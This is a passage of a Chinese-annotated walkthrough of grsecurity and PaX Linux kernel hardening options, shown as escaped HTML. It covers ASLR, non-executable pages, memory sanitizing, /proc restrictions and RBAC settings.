To see if your AMD processor supports RVI, see: http://support.amd.com/us/kbarticles/Pages/GPU120AMDRVICPUsHyperVWin8.aspx】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;( ) First-gen/No Hardware Virtualization&lt;/strong&gt; 【Choose this option if you use an Atom/Pentium/Core 2 processor that either doesn’t support hardware virtualization or doesn’t support the EPT/RVI extensions.】&lt;/p&gt;

&lt;h4 id=&quot;virtualization-software&quot;&gt;Virtualization Software&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Xen&lt;/strong&gt; 【（GRKERNSEC_CONFIG_VIRT_XEN）Choose this option if this kernel is running as a Xen guest or host.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;VMWare&lt;/strong&gt; 【Choose this option if this kernel is running as a VMWare guest or host.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;KVM&lt;/strong&gt; 【Choose this option if this kernel is running as a KVM guest or host.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;VirtualBox&lt;/strong&gt; 【Choose this option if this kernel is running as a VirtualBox guest or host.】&lt;/p&gt;

&lt;h4 id=&quot;required-priorities-performance&quot;&gt;Required Priorities (Performance)（优先级需求）&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Performance（性能优先）&lt;/strong&gt; 【选取这个选项将导致以下特性无法使用：UDEREF on a 64bit kernel, kernel stack clearing,clearing of structures intended for userland, and freed memory sanitizing】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Security（安全优先）&lt;/strong&gt; 【以上特性可用，但在最糟糕的情况下这些特性将导致20%的性能损耗】&lt;/p&gt;

&lt;h4 id=&quot;default-special-groups&quot;&gt;Default Special Groups（特殊组）&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;(1001) GID exempted(被免除) from /proc restrictions&lt;/strong&gt;
【通过设定这个GID来决定那个组中的用户能够免除/proc目录下Grsecurity规则的限制，允许特殊组的用户查看网络数据、和其他用户的运行信息。这个GID也可以在开机时在内核命令行中通过“grsec_proc_gid=”设置】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(1005) GID for TPE-untrusted users(TPE:Tursted Path Execution）&lt;/strong&gt; 【该组的用户将会受到TPE的限制。如果sysctl可用，sysctl中一个名为“tpe_gid”选项将会产生】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(1006) GID for users with kernel-enforced&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;customize-configuration&quot;&gt;Customize Configuration（自定义配置）&lt;/h2&gt;

&lt;h3 id=&quot;pax&quot;&gt;PaX&lt;/h3&gt;

&lt;h4 id=&quot;enable-various-pax-features&quot;&gt;Enable various PaX features&lt;/h4&gt;

&lt;p&gt;【Pax为内核提供了防止入侵机制，从而降低了可利用的内存漏洞造成的风险】&lt;/p&gt;

&lt;h4 id=&quot;pax-control&quot;&gt;PaX Control&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Support soft mode&lt;/strong&gt; 【（PAX_SOFTMODE）允许通过soft mode运行Pax，内核并不默认执行PaX保护功能,可以在运行时开启或关闭。。你必须同时启用PT_PAX_FLAGS或XATTR_PAX_FLAGS支持，因为只有它们能在soft mode下标记可运行程序。	soft mode可以使用“pax_softmode=1”参数通过内核命令行在开机时激活。	此外，在运行时你可以通过/proc/sys/kernel/pax的项目控制各种Pax特性。】【Non-SOFTMODE: The kernel enforces PaX protections by default for all features.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Use legacy ELF header marking&lt;/strong&gt; 【（PAX_EI_PAX）启用这个选项将允许你通过“chpax”工具（可在http://pax.grsecurity.net 获得）控制每一个可执行程序的Pax特性。控制信息可以在otherwise reserved 的部分ELF头部（其他情况保存的部分ELF头部？？）读取。这个标记有大量的弊端（没有对soft-mode的支持、工具链不知道ELF头部的不规范用法），因此这个特性相比于PT_PAX_FLAGS and XATTR_PAX_FLAGS已经过时.		要注意的是如果你启用PT_PAX_FLAGS or XATTR_PAX_FLAG标记支持，它们会覆盖传统的EI_PAX标记。		If you enable none of the marking options then all applications will run with PaX enabled on them by default.（仅是没有PT_PAX_FLAGS or XATTR_PAX_FLAG标记支持吗？？）】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Use ELF program header marking&lt;/strong&gt; 【（PAX_PT_PAX_FLAGS）启用这个选项将允许你通过“paxctl”工具（可在http://pax.grsecurity.net 获得）控制每一个可执行程序的Pax特性。控制信息可以从一个Pax特定的ELF程序头部读取。这个标记有同时支持soft-mode和完全整合toolchain。		要注意如果你同时启用了传统的EI_PAX标记支持，EI_PAX标记将被PT_PAX_FLAGS覆盖。		如果你同时启动了PT_PAX_FLAGS and XATTR_PAX_FLAGS支持，你应该确保被标记的二进制文件的标志是相同的。		If you enable none of the marking options then all applications will run with PaX enabled on them by default.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Use filesystem extended attributes（EA） marking（使用文件系统的扩展属性）&lt;/strong&gt; 【（PAX_XATTR_PAX_FLAGS）启用这个选项将允许你通过“setfattr”工具控制每一个可执行程序的Pax特性。控制信息可以从文件的扩展属性user.pax.flags读取（将Pax flags保存在EA中，从而不会修改ELF程序）。这个标记的好处是：支持可以自检的binary-only applications（如skype）并且不能兼容chpax/paxctl的改变。】【该特性主要的缺点是因为一些文件系统（如isofs, udf, vfat)不支持扩展属性，导致通过这类文件系统拷贝文件时将失去扩展属性和Pax标记。		要注意如果你同时启用了传统的EI_PAX标记支持，EI_PAX标记将被XATTR_PAX_FLAGS覆盖。	如果你同时启动了PT_PAX_FLAGS and XATTR_PAX_FLAGS支持，你应该确保被标记的二进制文件的标志是相同的。	If you enable none of the marking options then all applications will run with PaX enabled on them by default.】&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;==（//可通过cat /proc/’PID’/status&lt;/td&gt;
      &lt;td&gt;grep PaX来查看进程的Pax flags）==&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;mac-system-integrationmacmandatory-access-control-&quot;&gt;MAC system integration（集合）（MAC，Mandatory Access Control 强制访问控制）&lt;/h4&gt;

&lt;p&gt;【MAC系统具有控制每个可执行程序Pax标志的选项。选择你特定的系统支持的方法。		NOTE: this option is for developers/integrators only.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;none&lt;/strong&gt; 【（PAX_NO_ACL_FLAGS）如果MAC系统与Pax没有联系】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;direct&lt;/strong&gt; 【（PAX_HAVE_ACL_FLAGS）如果MAC系统自行定义pax_set_initial_flags参数】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;hook&lt;/strong&gt; 【（PAX_HOOK_ACL_FLAGS）如果MAC系统使用pax_set_initial_flags_func的回调】&lt;/p&gt;

&lt;h4 id=&quot;non-executable-pages&quot;&gt;Non-executable pages（不可执行页：只允许读和写，而代码执行是被禁止的）&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Enforce non-executable pages&lt;/strong&gt; 【(PAX_NOEXEC)勾选这个选项你将可以选择众多防止注入和外来代码的特性。但将使依赖原始方法（RWX权限系统???）和通过malloc()方法族动态分配内存的程序无法使用。如： XFree86 4.x server, the java runtime and wine.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Paging based non-executable pages&lt;/strong&gt; 【（PAX_PAGEEXEC）这个特性基于CPU的页特性。在没有硬件不可执行位支持的i386CPU里它是可变的，但通常带有较低的性能损耗。然而在基于Intel’s P4核心的CPU性能损耗将非常高，所有此类情况你应该禁止这个选项。对于拥有硬件不可执行位支持的CPU：alpha, avr32, ia64, parisc, sparc, sparc64, x86_64 and i386，这个特性没有性能损耗,在ppc下损耗可以忽略不计。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Emulate trampolines (模仿GCC扩展（回调？？？））&lt;/strong&gt; 【（PAX_EMUTRAMP）总有一些程序和库因为一些原因或意图去执行在禁止执行内存页中的特殊代码段，大量有名的例子是内核自己生成的信号句柄回调代码（kernel signal handler return code）和GCC trampolines。  如果你开启了CONFIG_PAX_PAGEEXEC这个特性这些进程将不能再运行。  作为补救，你可以启用这个选项并通过chpax、paxctl工具来为那些仍受到non-executable pages的保护的受影响的程序启用trampoline emulation。  在工作站(On parisc)你必须开启这个选项和EMUSIGRT，否则你的系统将无法启动！】【另外的，你可以在这里选否，并使用chpax或paxctl工具为受影响的文件禁用CONFIG_PAX_PAGEEXEC and CONFIG_PAX_SEGMEXEC特性。】【开启这个特性可能会从non-executable pages的保护中打开一个漏洞。因此最好的解决方法是不使用任何请求这个选项的文件。这可以通过不使用libc5（因为它依赖kernel signal handler return code）和不使用或重写通过GCC实现的嵌套函数的程序。  有经验的使用者可以直接修改GCC使嵌套函数不干扰Pax。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Restrict mprotect()（限制mprotect()）&lt;/strong&gt; 【(PAX_MPROTECT)启用这个特性将阻止进程进行以下操作：1、改变未被初始化为可执行的内存页的可执行状态；2、使只读的可执行页可再次写入；3、在分配的内存中创建可执行页；4、让重定位后只读的（RELRO）数据页可再次写入】【你应该启用这个特性来完善non-executable pages提供的强制保护措施.  Note:你可以使用chpax或paxctl来控制每个可执行程序的这个属性】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Use legacy/compat protection demoting (read help)（使用传统/可兼容的安全措施（如RWX权限？）降低pax安全作用的影响）&lt;/strong&gt; 【（PAX_MPROTECT_COMPAT）现在的PAX_MPROTECT实现机制通过发送适当的错误代码给应用程序来阻止RWX权限分配。对于一些broken userland，Python或其他应用可能会造成问题。The current implementation however allows for applications like clamav to detect if JIT compilation/execution is allowed and to fall back gracefully to an interpreter-based mode if it does not.  While we encourage everyone to use the current implementation as-is and push upstream to fix broken userland (note that the RWX logging option can assist with this), in some environments this may not be possible. Having to disable MPROTECT completely on certain binaries reduces the security benefit of PaX,所以这个选项用来使会出现问题的这类环境恢复到old behavior】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Allow ELF text relocations (read help) (Executable and Linking Format，ELF，可执行文件)&lt;/strong&gt; 【(PAX_ELFRELOCS)Non-executable pages and mprotect()的限制对阻止新的可执行代码进入攻击任务的地址空间很有用。 There remain only two venues for this kind of attack:if the attacker can execute already existing code in the attacked task then he can either have it create and mmap() a file containing his code or have it mmap() an already existing ELF library that does not have position independent code in it and use mprotect() on it to make it writable and copy his code there.  While protecting against the former approach is beyond PaX, the latter can be prevented by having only PIC ELF libraries on one’s system (which do not need to relocate their code).&lt;em&gt;（如果攻击者可以执行在攻击任务中已存在的代码，那他可以创建它并mmap（）到一个包含他的代码的文件 或者 把它mmap（）到一个已存在的没有独立位置的代码的ELF库并且使用mprotect（）使其变得可写入并把他的代码复制进去？）&lt;/em&gt;。  如果你确定这跟你的情况相似，因为所有现代Linux发行版都有这个情况，让这个选项禁用——这里应该选否。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Enforce non-executable kernel pages&lt;/strong&gt; 【该选项相当于内核态的mprotect和pageexec。启用这个选项将使在系统区中注入和外来代码的执行更加困难。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;Return Address Instrumentation Method&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;—-&amp;gt;bts&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;—-&amp;gt;or&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;address-space-layout-randomization&quot;&gt;Address Space Layout Randomization(地址空间随机化)&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Address Space Layout Randomization&lt;/strong&gt; 【（PAX_ASLR）接下来的选项会让内核在特定的程序部分采取随机化，因此强迫攻击者在众多的情况中猜测程序的位置。在允许内核检测这类意图并回应它的前提下，任何一个失败的猜测都很可能导致被攻击的程序崩溃。启用这个选项你可以选择随机化下面的区域：1、 top of the task’s kernel stack；2、 top of the task’s userland stack；3、 base address for mmap() requests that do not specify one(this includes all libraries)；4、 base address of the main executable。强烈建议打开这个选项，因为它提供有效的保护且损失性能的可以忽略不计。  Note：可以使用chpax和paxctl控制每个可执行程序的该特性。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Randomize kernel stack base&lt;/strong&gt; 【（PAX_RANDKSTACK）启用这个选项将随机化每一个任务的每一个系统调用内核栈。强迫攻击者猜测，且能防止他利用有关的可能已经泄露的信息。注意，一旦kernel stack紧缺，可能导致堆栈溢出，所以你要认真测试你的系统。  一旦在内核配置中启用这个选项，基于这个特性的文件将无法禁用这个特性。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Randomize user stack and mmap() base&lt;/strong&gt; 【（PAX_RANDUSTACK）user stack：内核随机化每一个任务的用户栈。随机化过程分为两步，第二步将采用大量的栈顶移位，从而导致程序需要大量的内存（如果SEGMEXEC未被启用将超过2.5G，如果启用了将为1.25G）。  因为这个原因，在每个基于这个特性的文件第二步可以被chpax和paxctl控制。】【（PAX_RANDMMAP）mmap，内存映射机制。如果选是，mmap()请求将不自己指定地址，内核将为之使用基于随机的地址。结果是所有动态加载的库将在一个随机的地址出现，并因此使攻击者执行library code的意图更困难。 Furthermore, if a program is relinked as a dynamic ELF file, its base address will be randomized as well, completing the full randomization of the address space layout.  攻击这样的程序将变成一个猜测游戏。】&lt;/p&gt;

&lt;h4 id=&quot;miscellaneous-hardening-features&quot;&gt;Miscellaneous hardening features(杂项优化）&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Sanitize all freed memory （清除已释放内存）&lt;/strong&gt; 【一旦内存被释放，内核将清除内存页和slab对象（Linux下的一种内存分配机制）。这可以轮流减少存储数据的生命周期，避免密码等敏感数据在内存太长时间。对运行时间短的进程尤其有好处,long lived processes and the kernel itself benefit from this as long as they ensure timely freeing of memory that may hold sensitive information.作为交易，这可能对性能有所影响，在单CPU系统中内核编译可能会慢3%，部署该选项前最好在工作负荷下测试一下性能损失。要注意这个特性不会保护存储在仍然存活的内存页中的数据】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Sanitize kernel stack&lt;/strong&gt; 【内核将在系统调用返回前清除内核栈,这会减少内核栈leak bug泄露的信息。这同样会造成性能损耗，最好在工作环境下测试一下。完整的特性需要GCC插件的支持，例如GCC4.5或更新的版本。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Forcibly initialize local variables copied to userland(对复制到用户态的局部变量进行强制初始化)&lt;/strong&gt; 【内核将对一些被复制到用户态的局部变量进行0初始化操作。The tradeoff is less performance impact than PAX_MEMORY_STACKLEAK at a much smaller coverage.  This in turn prevents unintended information leakage from the kernel stack should later code forget to explicitly set all parts of the copied variable.完整的特性需要GCC插件的支持】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Prevent invalid userland pointer dereference（阻止间接引用不合法的用户态指针）&lt;/strong&gt; 【在只允许内核指针的环境下内核将阻止间接引用用户态指针，这是一个有用的运行时debugging feature和阻止渗透内核bugs的一个安全方法。作为交换，一些虚拟化措施将遭受到可观的延迟，因此如果内核将运行在这类环境上你应该禁用这个特性。一个给定虚拟环境是否会受到影响最好通过一些简单的测试再决定。性能损耗将会在开机的时候最为明显。一个重要的准则是虚拟机运行在没有硬件虚拟化支持的CPU上会很可能遭到这类延迟。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Prevent various kernel object reference counter overflows(阻止各类内核对象引用计数器溢出)&lt;/strong&gt; 【内核会检查并阻止溢出的各类（但不是全部）对象引用计数器。作为交易，被溢出引用计数机制保护的数据结构将不会被释放，从而导致内存泄露。需要注意到的是即使没有这种保护，这种泄露也会发生。但是那样的话，泄露出的大量数据会最终引发数据结构的freeing（&lt;em&gt;//解释为内存释放还是数据自由？&lt;/em&gt;）, 即使这种数据结构正在被用于别处的时候。这会最终导致这个特性所阻止的渗透的情况的发生。鉴于该特性对性能损耗微乎其微，建议启用这个特性】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Automatically constify eligible structures （自动常量化符合条件的结构)&lt;/strong&gt; 【the compiler will automatically constify a class of types that contain only function pointers.它减少了内核的受攻击面并产生了更好的内存配置。此特性需要GCC4.5及以上。要注意的是，如果一些代码不得不修改已常量化的变量，那源代码将作为补丁才能被使用。 Examples can be found in PaX itself (the no_const attribute) and for some out-of-tree modules at http://www.grsecurity.net/~paxguy1/ .】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Harden heap object copies between kernel and userland （加固用户与内核之间堆对象的拷贝）&lt;/strong&gt; 【内核会限制堆对象的大小，当它们被在内核态和用户态之间的目录拷贝时。这种检查防止在内核向用户拷贝时造成内核堆的信息泄露，并且防止在用户向内核拷贝时造成内核堆溢出。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Prevent various integer overflows in function size parameters&lt;/strong&gt; 【选择这个选项内核会重新计算被标记为size_overflow特征的具有双精度整数的函数参数的表达式。The recomputed argument is checked against TYPE_MAX and an event is logged on overflow and the triggering process is killed.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Generate some entropy during boot and runtime （在开机和运行时生成一些无序状态量（平均信息量））&lt;/strong&gt; 【选择这个选项内核会利用某些内核代码从原始以及手动产生的程序状态中提取无序状态量This will help especially embedded（嵌入式） systems where there is little ‘natural’ source of entropy normally. The cost is some slowdown of the boot process and fork（分岔） and irq（中断请求） processing.注意这个提取entropy的方法不是密码级别的安全】&lt;/p&gt;

&lt;h3 id=&quot;memory-protections&quot;&gt;Memory Protections（内存保护）&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Deny reading/writing to /dev/kmem, /dev/mem, and /dev/port&lt;/strong&gt; 【（GRKERNSEC_KMEM）如果你启用这个选项，在运行的内核上/dev/kmem和/dev/mem将无法读写，/dev/port也将不允许被打开。/dev/cpu/*/msr和kexec的支持将被删除。If you have module support disabled, enabling this will close up six ways that are currently used to insert malicious code（恶意代码） into the running kernel.就算这个特性被启用，我们依然高度建议你使用RBAC系统，因为攻击者仍然可能通过鲜为人知的代码修改运行的内核。启用这个选项会阻止cpupower和powertop工具的运行。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disable privileged I/O&lt;/strong&gt; 【（kernel.grsecurity.disable_priv_io）启用这个选项，所有ioperm和iopl调用都会返回error。不幸的是一些程序需要这个通道来正确地运行，最著名的是XFree86 and hwclock。hwclock可以通过内核的RTC（real-time clock)支持补救，所以如果这个选项启用，那RTC也将可用，用来保证hwclock正确运行。如果你正使用XFree86或Xorg2012或更早的版本，你可能导致无法使用图形界面，在这种情况下你应该使用RBAC系统。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Harden BPF JIT against spray attacks&lt;/strong&gt; 【（GRKERNSEC_JIT_HARDEN）？？？】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disable unprivileged PERF_EVENTS usage by default&lt;/strong&gt; 【sysctl中的/proc/sys/kernel/perf_event_paranoid取值范围将被允许扩大，并且的得到一个新的默认值3。当sysctl被设置成这个值时，对PERF_EVENTS系统调用接口没有权限的使用将被允许。虽然PERF_EVENTS能被合法地用来管理性能和低等级应用分析，但是这建立在强制忽略配置上，是一些漏洞的原因所在，也为边缘途径和信息泄露产生新的机会。这个特性将PERF_EVENTS设置为一个默认的安全状态，并且如果有不具备权限的程序分析需要，允许管理员暂时更改它的值。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Insert random gaps between thread stacks（在线程栈中插入随机间隙）&lt;/strong&gt; 【（GRKERNSEC_RAND_THREADSTACK）一个随机大小的间隙将会强制插入已分配的线程栈中。Glibc’s NPTL and other threading libraries that pass MAP_STACK to the kernel for thread stack allocation are supported.这个implements目前为间隙提供8位的平均信息。Many distributions do not compile threaded remote services with the -fstack-check argument to GCC, causing the variable-sized stack-based allocator, alloca(), to not probe the stack on allocation. 这将允许一个无界限alloca()来跳过所有保护页面，潜在并有把握地修改其他的线程栈。一个强制随机的间隙可以降低这类攻击的可靠性and increases the chance that such a read/write to another thread’s stack instead lands in an unmapped area,导致崩溃并触发Grsecurity的anti-bruteforcing（反暴力破解）逻辑。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Harden ASLR against information leaks and entropy reduction （加强ASLR来抵御信息泄露和平均状态量减少）&lt;/strong&gt; 【（GRKERNSEC_PROC_MEMMAP）如果启用这个特性，并且Pax中的依赖随机地址特性在任务中被启用，那/proc//maps和/proc//stat文件将不再给出地址映射信息。另外还将清除这些信息并禁用那些危险源的信息。this option causes reads of sensitive /proc/ entries（条目） where the file descriptor（描述子） was opened in a different task than the one performing the read.这类意图将会被记录。This option also limits argv/env strings for suid/sgid binaries to 512KB to prevent a complete exhaustion of the stack entropy provided by ASLR. Finally, it places an 8MB stack resource limit on suid/sgid binaries to prevent alternative mmap layouts from being abused.】【如果你使用Pax，启用这个选项至关重要，因为它关闭了许多让完整的ASLR局部失效的漏洞】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Prevent kernel stack overflows&lt;/strong&gt; 【（GRKERNSEC_KSTACKOVERFLOW）内核的进程栈将使用vmalloc来进行分配，而不是内核默认的分配器。This introduces guard pages that in combination with the alloca checking of the STACKLEAK feature prevents all forms of kernel process stack overflow abuse.要注意这个特性与内核栈缓存溢出不一样.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Deter exploit bruteforcing（阻止暴力破解）&lt;/strong&gt; 【（GRKERNSEC_BRUTE， kernel.grsecurity.deter_bruteforce）启动这个选项，尝试暴力破解分支后台进程如apche和sshd以及suid/sgid下的二进制文件的意图都会被阻止。当一个forking deamon的子进程被Pax或因为一个不合法的操作或其他可疑信号杀死、崩溃时，（the parent process will be delayed 30 seconds upon every subsequent fork）父进程将在之后的每个分支延迟30秒，直到管理员能评定这个情况并重启这个后台程序。 在suid/sgid方面，这个意图会被记录，the user has all their existing instances of the suid/sgid binary terminated，并在15分钟内不能执行任何suid/sgid的二进制程序。 建议你在审计部分开启信号记录使得每当进程触发可疑信号时就生成记录。 如果sysctl选项可用，一个名为”deter_bruteforce”的选项会被生成。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Harden module auto-loading（模板自动加载的加固）&lt;/strong&gt; 【（GRKERNSEC_MODHARDEN）module auto-loading in response to use of some feature implemented by an unloaded module will be restricted to root users。Enabling this option helps defend against attacks by unprivileged users who abuse（滥用） the auto-loading behavior to cause a vulnerable（有漏洞的） module to load that is then exploited. 如果这个选项阻止了非root用户合理的自动加载，管理员可以通过使用警告日志中提到的准确的模块的名字手动执行模块。另外，管理员可以通过修改init脚本添加模块到开机模块加载列表中去。 拥有加密home目录支持的ubuntu服务器可能更需要对init脚本的修改，as the first non-root user logging in will cause the ecb(aes), ecb(aes)-all, cbc(aes), and cbc(aes)-all modules to be loaded.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hide kernel symbols&lt;/strong&gt; 【（GRKERNSEC_HIDESYM）启用这个选项，users with CAP_SYS_MODULE通过系统调用从已加载的模块中获得信息和显示所有内核标志的操作将被限制。由于软件的兼容性的原因，root用户对/proc/kallsyms目录将会被限制。RBAC系统将会隐藏entry（条目？入口？），即使是针对root用户。 该选项同样通过/proc一些条目防止内核地址的泄露。 要注意，当且仅当遇到下列情况时，该选项才会起作用：1、内核正使用的Grsecurity没有被一些发行版预先编译过了；2、你还应该同时启用了GRKERNSEC_DMESG特性；3、你正使用RBAC系统并且隐藏其他文件，例如kernel image and System.map。除此之外，启用这个选项将获得在编译时改变/boot, /lib/modules, and the kernel source这些目录的许可，以防止非root用户查看。  如果以上的情况都符合，这个选项将有助于对局部内核可利用溢出和任意读写漏洞（local kernel exploitation of overflows and arbitrary read/write vulnerabilities）提供有用的保护。 强烈建议你再此之外启用GRKERNSEC_PERF_HARDEN特性】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Randomize layout of sensitive kernel structures （敏感内核结构的随机配置）&lt;/strong&gt; 【（GRKERNSEC_RANDSTRUCT）许多敏感内核结构（如task, fs, cred, etc)和all structures composed entirely of function pointers (aka “ops” structs)的配置将在编译的时候被随机化。This can introduce the requirement of an additional infoleak vulnerability for exploits targeting these structure types.		使用这个选项会产生一些性能损耗，轻微地增加内存使用，并且阻止取证工具（forensic tools）如Volatility的使用（除非内核资源树在内核安装完后没有清除。		编译的种子放在tools/gcc/randomize_layout_seed.h中。这在一个允许的make clean命令后会保留下来，用来使用先用的种子来编译external modules，并且可以通过make mrproper或make distclean被删除。】&lt;/p&gt;

&lt;p&gt;**Use cacheline-aware structure randomization ** 【（GRKERNSEC_RANDSTRUCT_PERFORMANCE）If you say Y here, the RANDSTRUCT randomization will make a best effort at restricting randomization to cacheline-sized groups of elements. It will further not randomize bitfields in structures. This reduces the performance hit of RANDSTRUCT at the cost of weakened randomization.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Active kernel exploit response&lt;/strong&gt; 【（GRKERNSEC_KERN_LOCKOUT）启用这个选项，当一个Pax警告触发，原因是可疑的内核活动(from KERNEXEC/UDEREF/USERCOPY)或因为bad memory accesses导致一个OOPS（意外？？）发生，我们将使用一下两个措施中的一个，而不是直接终止攻击进程(and potentially allowing a subsequent（后来的） exploit from the same user)：1如果用户是root，we will panic the system；2、如果用户不是root，我们会记录这个行为，终止该用户的所有进程，然后在系统重启前阻止他们创建任何新进程。This deters repeated kernel exploitation/bruteforcing attempts and is useful for later forensics.】&lt;/p&gt;

&lt;h3 id=&quot;role-based-access-control-options&quot;&gt;Role Based Access Control Options&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Disable RBAC system&lt;/strong&gt; 【（GRKERNSEC_NO_RBAC）如果这里选是，/dev/grsec设备将从内核中删除，来阻止RBAC系统生效。		应该仅在你不打算使用RBAC时才选Yes，以防止当可加载的模块支持并且/dev/[k]mem已被锁定时，攻击者通过错误使用的RBAC系统使用root权限来隐藏文件或进程。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hide kernel processes&lt;/strong&gt; 【（GRKERNSEC_ACL_HIDEKERN）如果这里选是，除了有”view hidden processes”标志的subject，所有内核线程将对所有进程隐藏。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;() Maximum tries before password lockout （最大密码尝试次数）&lt;/strong&gt; 【（GRKERNSEC_ACL_MAXTRIES）这个选项强制设定用户在Grsecurity RBAC系统中认证自己的最大次数，超过特定次数将被拒绝再次认证。数字越小，密码越难被暴力破解。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;() Time to wait after max password tries, in seconds&lt;/strong&gt; 【（GRKERNSEC_ACL_TIMEOUT）这个选项指定用户在RABC系统认证失败达最大次数后必须等待的时间。数字越大，密码越难被暴力破解。】&lt;/p&gt;

&lt;h3 id=&quot;filesystem-protections&quot;&gt;Filesystem Protections&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Proc restrictions&lt;/strong&gt; 【（GRKERNSEC_PROC）如果选是，/proc文件系统的访问权限将会改变，以加强系统安全和隐私。你必须在用户限制和用户及用户组限制中选择一个。根据你的选择，你可以把用户限制在只能查看自己运行的进程，或choose a group that can view all processes and files normally restricted to root if you choose the “restrict to user only” option. 		注意，如果你以非root身份运行identd或者ntpd（网络时间校正协议(network time protocol daemon)），你必须在你指定的组里运行。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Restrict /proc to user only&lt;/strong&gt; 【（GRKERNSEC_PROC_USER）如果选是，非root用户将只能查看他们自己的进程，并且会被禁止查看网络相关的信息、内核标志和模块信息。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Allow special group&lt;/strong&gt; 【（GRKERNSEC_PROC_USERGROUP）如果选是，你可以选择一个组，这个组将可以查看所有进程的信息以及网络相关的信息。如果你启用了GRKERNSEC_HIDESYM选项，内核的标志信息可能依旧对这个组隐藏。 如果你想以非root身份运行identd，这将很有帮助。 你选择的组也可以在开机时通过”grsec_proc_gid=”在内核命令行选择。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;() GID for special group&lt;/strong&gt; 【（GRKERNSEC_PROC_GID）设置这个GID决定那个组将可以避免Grsecurity对/proc的限制，允许该特殊组的用户查看网络数据和其他用户进程的存在信息。该GID也可以在开机时通过”grsec_proc_gid=”参数在内核命令行设定。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Additional restrictions&lt;/strong&gt; 【（GRKERNSEC_PROC_ADD）如果选是，/proc将会添加附加的限制来阻止用户查看device和slabinfo信息（因为这些信息对exploits（渗透？）很有用）】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Linking restrictions&lt;/strong&gt; 【（GRKERNSEC_LINK、kernel.grsecurity.linking_restrictions）如果选是，race exploits将被阻止，因为在可写+t（world-write +t)的目录下（如/tmp)用户将不能再跟踪其他用户的符号链接，除非符号链接的所有者也是目录的所有者。 用户同样无法硬链接到不属于他们的文件上。如果sysctl被启用，一个名为”linking_restrictions”的sysctl选项被创建。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Kernel-enforced SymlinksIfOwnerMatch&lt;/strong&gt;* 【？？？】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;（）GID for users with kernel-enforced SymlinksIfOwnerMatch&lt;/strong&gt; 【】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;FIFO restrictions&lt;/strong&gt; 【（GRKERNSEC_FIFO、kernel.grsecurity.fifo_restrictions） users will not be able to write to FIFOs they don’t own in world-writable +t directories (e.g. /tmp), unless the owner of the FIFO is the same owner of the directory it’s held in.】&lt;/p&gt;

